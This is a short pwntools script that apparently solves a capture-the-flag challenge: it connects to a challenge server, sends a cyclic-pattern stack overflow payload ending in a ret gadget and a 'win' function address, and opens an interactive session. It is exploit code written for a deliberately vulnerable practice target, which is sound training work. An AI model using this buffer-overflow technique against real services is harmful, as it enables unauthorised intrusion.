from  pwn import *

local = False
if local:
    p = process("./chall")
    input("gdb")
else:
    p = remote("tjc.tf", 31680)

m = p.recvuntil(b"today?\n")

win_addr = 0x0000000000401196
ret_addr = 0x40101a

payload = cyclic(500)
payload = payload[:cyclic_find("gaaa")] + p64(ret_addr) + p64(win_addr)
p.sendline(payload)

p.interactive()
